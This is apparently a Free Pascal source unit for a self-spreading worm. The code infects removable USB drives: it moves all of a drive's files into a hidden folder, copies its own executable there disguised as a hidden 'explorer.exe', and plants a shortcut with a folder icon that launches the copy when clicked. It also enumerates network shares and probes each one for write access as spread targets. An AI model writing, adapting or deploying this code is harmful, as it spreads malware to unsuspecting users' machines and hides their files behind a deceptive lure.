unit Spread;

{$mode objfpc}{$H+}

interface

uses
  Windows, SysUtils, Classes, ShellApi, ShlObj, ComObj, ActiveX;

procedure InfectUSBDrives;
procedure InfectNetworkDrives;

implementation

var
  AlreadyTried: TStringList;

const
  DeskAttr = faHidden{%H-} or faSysFile{%H-} or faReadOnly;
  SysAttr  = faHidden{%H-} or faSysFile{%H-};

procedure CreateLink(const PathObj, PathLink, Desc, Param: string);
var
  IObject: IUnknown;
  SLink: IShellLink;
  PFile: IPersistFile;
begin
  CoInitialize(Nil);
  IObject:=CreateComObject(CLSID_ShellLink);
  SLink:=IObject as IShellLink;
  PFile:=IObject as IPersistFile;
  with SLink do
  begin
    SetArguments(PChar(Param));
    SetDescription(PChar(Desc));
    SetPath(PChar(PathObj));
    SetIconLocation('C:\Windows\system32\SHELL32.dll', 7);
  end;
  PFile.Save(PWChar(WideString(PathLink)), FALSE);
  CoUninitialize;
end;

function GetVolumeLabel(DriveChar: Char): string;
var
  NotUsed:     DWORD;
  VolumeFlags: DWORD;
  VolumeInfo:  array[0..MAX_PATH] of Char;
  VolumeSerialNumber: DWORD;
  Buf: array [0..MAX_PATH] of Char;
begin
    GetVolumeInformation(PChar(DriveChar + ':\'),
    Buf, SizeOf(VolumeInfo), @VolumeSerialNumber, NotUsed{%H-},
    VolumeFlags{%H-}, nil, 0);

    SetString(Result, Buf, StrLen(Buf));
end;


function SysCopy(const srcFile, destFile : string) : boolean;
var
  shFOS : TShFileOpStruct;
begin
  ZeroMemory(@shFOS, SizeOf(TShFileOpStruct));
  shFOS.Wnd := 0;
  shFOS.wFunc := FO_MOVE;
  shFOS.pFrom := PChar(srcFile + #0);
  shFOS.pTo := PChar(destFile + #0);
  shFOS.fFlags := FOF_NOCONFIRMMKDIR or FOF_SILENT or FOF_NOCONFIRMATION or FOF_NOERRORUI;
  Result := SHFileOperation(shFOS) = 0;
end;

Procedure InfectUSBDrives;
var
  DriveMap, dMask: DWORD;
  I: Char;
  D, Lbl: String;
  FFile: Text;
Begin
    DriveMap:=GetLogicalDrives;
    dMask:=1;
    For I:='A' to 'Z' do Begin
      if (dMask and DriveMap)<>0 then
        if GetDriveType(PChar(I+':\'))=DRIVE_REMOVABLE then Begin
          Lbl:=GetVolumeLabel(I);
          D:=I+':\'+Lbl;
          if Not(DirectoryExists(D)) then Begin
            Writeln('Uninfected [',I,'] found.');
            try
              MkDir(D);
            except
            end;
            if DirectoryExists(D) then Begin
              SysCopy(I+':\*.*', D);
              AssignFile(FFile, D+'\desktop.ini');
              Rewrite(FFile);
              Writeln(FFile,'[.ShellClassInfo]');
              Writeln(FFile,'IconResource=C:\Windows\system32\SHELL32.dll,7');
              CloseFile(FFile);
              FileSetAttr(D+'\desktop.ini', DeskAttr);
              CopyFile(PChar(ParamStr(0)), PChar(D+'\explorer.exe'), False);
              FileSetAttr(D+'\explorer.exe', SysAttr);
              FileSetAttr(D, SysAttr);
              //Create shortcut
              CreateLink(D+'\explorer.exe', I+':\'+Lbl+' ('+I+').lnk', 'Files and Documents', '/open "'+D+'"');
            end;
          end;
          Sleep(2000);
        end;
      dMask:=dMask shl 1;
    end;
end;

procedure EnumNetworkResources(NetResource: PNEtResource; List: TStrings);
var
 Count, BufSize, I: Cardinal;
 EnumHandle: LongWord;
 NetArray: array[0..250] of TNetResource;
begin
 if WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NetResource,EnumHandle) = NO_ERROR then
  try
   Count := $FFFFFFFF;
   BufSize := SizeOf(NetArray);
   if WNetEnumResource(EnumHandle, Count, @NetArray, BufSize) = NO_ERROR then
    begin
     for i := 0 to Count -1 do
      begin
       if NetArray[i].dwType=RESOURCETYPE_DISK Then List.Add(NetArray[i].lpRemoteName);
       EnumNetworkResources(@NetArray[i], List);
      end;
    end;
  finally
   WNetCloseEnum(EnumHandle);
  end;
end;

function WriteAccess(Path: String): Boolean;
var
  FFile: Text;
  TempFile: PChar;
  Unique: Word;
Begin
  Unique:=Random(High(Word));
  Result:=(GetTempFileName(PChar(Path), 'wchk', Unique, TempFile)=Unique);
  if Result then Begin
    try
      AssignFile(FFile, TempFile);
      Rewrite(FFile);
      CloseFile(FFile);
      DeleteFile(TempFile);
    except
      Result:=False;
    end;
  end;
end;

procedure InfectNetworkDrives;
var
  AList: TStringList;
  J: LongInt;
Begin
  Writeln('Network spreading started.');
  AList:=TStringList.Create;
  if Not(Assigned(AlreadyTried)) then
    AlreadyTried:=TStringList.Create;
  EnumNetworkResources(Nil, AList);
  Writeln('Enumeration complete.');
  For J:=0 to AList.Count - 1 do
  if AlreadyTried.IndexOf(AList.Strings[J])=-1 then Begin
    if WriteAccess(AList.Strings[J]) then Begin
      Write('YES: ');
    end else Write('NO: ');
    Writeln(AList.Strings[J]);
    AlreadyTried.Add(AList.Strings[J]);
  end;
  AList.Free;
  Writeln('Network spreding stopped.');
end;

end.

